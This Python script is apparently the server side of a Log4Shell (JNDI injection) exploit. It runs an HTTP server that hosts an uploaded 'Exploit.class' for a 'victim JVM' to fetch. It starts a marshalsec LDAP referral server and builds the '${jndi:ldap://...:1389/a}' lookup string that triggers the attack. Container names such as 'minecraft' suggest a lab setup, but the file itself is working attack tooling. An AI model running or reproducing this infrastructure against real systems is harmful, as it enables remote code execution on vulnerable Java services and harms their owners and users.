import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
import socket
import re
import urllib


class SimpleFileServer(BaseHTTPRequestHandler):
    # --- Configuration for this specific server ---
    REQUIRED_FILENAME = 'Exploit.class'

    def _send_html(self, html, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())

    # New method for redirection
    def _redirect(self, path):
        self.send_response(302)
        self.send_header('Location', path)
        self.end_headers()

    def _safe_filename(self, raw_name):
        # 1. New: Check if the filename is exactly what is required
        base = os.path.basename(urllib.parse.unquote(raw_name))
        if base != self.REQUIRED_FILENAME:
            raise ValueError(f"Filename must be exactly '{self.REQUIRED_FILENAME}'")

        # 2. Existing safety checks (can be simplified since we enforce the name)
        decoded = urllib.parse.unquote(raw_name.lstrip("/"))

        # We can skip most of the original complex checks since we force a simple, known filename.
        # Keeping this for robustness against unexpected input format.
        if len(base) > fileNameLen: # Needs fileNameLen to be globally defined
            raise ValueError("Filename too long")

        # The file extension check (e.g., against allowedExtensions) is now redundant
        # as we enforce the full name 'Exploit.class', but you could keep it for context.

        if re.search(r'[\x00-\x1f\x7f]', base):
            raise ValueError("Invalid characters")

        return base

    # --- Renaming _serve_latest_file to be more specific to the required file ---
    def _serve_exploit_file(self):
        file_path = os.path.join(uploadDir, self.REQUIRED_FILENAME)

        if not os.path.exists(file_path):
            self._send_html(f"<h3>Error: {self.REQUIRED_FILENAME} not found. Please upload it first.</h3>", status=404)
            return

        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Disposition", f'attachment; filename="{self.REQUIRED_FILENAME}"')
        self.send_header("Content-Length", str(os.path.getsize(file_path)))
        self.end_headers()

        with open(file_path, "rb") as f:
            while chunk := f.read(64 * 1024):
                self.wfile.write(chunk)

    def do_GET(self):
        # New: Redirect / and /index.html to /upload
        if self.path in ("/", "/index.html"):
            self._redirect("/upload")
            return

        # New: Serve the file when requested by its exact name (with or without .class)
        # This is the path the victim JVM will request.
        if self.path in (f"/{self.REQUIRED_FILENAME}", f"/{self.REQUIRED_FILENAME.split('.')[0]}"):
            self._serve_exploit_file()
            return

        if self.path in ("/upload", "/upload?"):
            self._send_html(f"""
                <html><body style="font-family:sans-serif;margin:2em;">
                <h2>Upload Required File: {self.REQUIRED_FILENAME}</h2>
                <form enctype="multipart/form-data" method="post" action="/upload">
                  <input type="file" name="file" required><br><br>
                  <input type="submit" value="Upload" style="padding:6px 12px;">
                </form>
                </body></html>
            """)
            return

        self.send_error(404, "Not Found")

    def do_POST(self):
        if self.path != "/upload":
            self.send_error(404, "Unknown POST endpoint")
            return

        content_type = self.headers.get("Content-Type", "")
        if "multipart/form-data" not in content_type:
            self.send_error(400, "Content-Type must be multipart/form-data")
            return

        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)

        try:
            boundary = content_type.split("boundary=")[1].encode()
        except IndexError:
            self.send_error(400, "No boundary in Content-Type")
            return

        uploaded_file_data = None
        filename = None
        parts = body.split(b"--" + boundary)

        for part in parts:
            if b'Content-Disposition' in part and b'name="file"' in part:
                match = re.search(rb'filename="([^"]+)"', part)
                filename = match.group(1).decode(errors="ignore") if match else "uploaded_file"
                uploaded_file_data = part.split(b"\r\n\r\n", 1)[1].rsplit(b"\r\n", 1)[0]
                break

        if not uploaded_file_data:
            self.send_error(400, "No file uploaded")
            return

        try:
            # Enforce the filename 'Exploit.class'
            safe_name = self._safe_filename(filename)
        except ValueError as e:
            self.send_error(400, f"Upload error: {e}")
            return

        # New: Force the file to be saved as the REQUIRED_FILENAME, overwriting previous versions
        file_path = os.path.join(uploadDir, self.REQUIRED_FILENAME)
        with open(file_path, "wb") as f:
            f.write(uploaded_file_data)

        # Get the server's IP address and port to construct the access URL
        host = self.server.server_address[0]
        port = self.server.server_address[1]

        # New: Success message includes the access URL
        access_url = f"http://{host}:{port}/{self.REQUIRED_FILENAME.split('.')[0]}"

        self._send_html(f"""
            <html><body style="font-family:sans-serif;margin:2em;">
            <h3>Upload successful: {safe_name}</h3>
            <p>The file is now being served at the following path:</p>
            <pre><code>{access_url}</code></pre>
            <p>Return to <a href="/upload">upload page</a>.</p>
            </body></html>
        """)

def servePayload(userip: str, webport: int, lport: int) -> None:

    # create the LDAP server on new thread
    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
    t1.start()

    # start the web server
    print("Starting web server)")
    httpd = HTTPServer(('0.0.0.0', webport), SimpleFileServer)
    print("Web server started on port {}".format(webport))
    httpd.serve_forever()

def ldap_server(userip: str, lport: int) -> None:
    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
    url = "http://{}:{}/#Exploit".format(userip, lport)
    subprocess.run([
        os.path.join(CUR_FOLDER, "jdk1.8.0_181/bin/java"),
        "-cp",
        os.path.join(CUR_FOLDER, "marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])

def get_network_ips():
    # Resolve container hostnames dynamically if known
    containers = ["minecraft", "bot"]
    ips = set()
    for c in containers:
        try:
            ips.add(socket.gethostbyname(c))
        except socket.gaierror:
            pass
    return ips



def main() -> None:
    ip = subprocess.check_output("hostname -I", shell=True).decode().strip()
    httpport = 8000

    try:
        servePayload(ip, httpport, 1389)
    except KeyboardInterrupt:
        raise SystemExit(0)


CUR_FOLDER = Path(__file__).parent.resolve()
uploadDir = "uploads"
os.makedirs(uploadDir, exist_ok=True)
uploaded_files = set()
allowedExtensions = {".class"}
fileNameLen = 200

if __name__ == "__main__":
    main()










